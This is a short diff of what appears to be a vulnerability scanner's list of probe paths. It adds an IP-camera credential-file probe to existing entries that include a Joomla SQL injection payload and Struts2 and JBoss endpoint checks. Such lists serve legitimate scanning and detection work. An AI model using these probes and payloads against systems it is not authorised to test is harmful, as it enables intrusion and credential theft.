@@ -17,3 +17,4 @@
 /index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(0x23,concat(1,md5({{num}})),1)
 /integration/saveGangster.action
 /jbossmq-httpil/HTTPServerILServlet
+/system.ini?loginuse&loginpas
